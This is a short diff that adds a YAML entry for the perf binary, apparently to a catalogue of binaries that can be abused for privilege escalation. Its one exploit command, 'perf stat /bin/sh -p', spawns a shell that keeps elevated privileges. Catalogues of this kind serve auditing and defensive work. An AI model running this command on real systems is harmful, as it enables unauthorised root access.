@@ -1,0 +1,4 @@
+name: perf
+binary_path: /usr/bin/perf
+exploit_cmds:
+- /usr/bin/perf stat /bin/sh -p
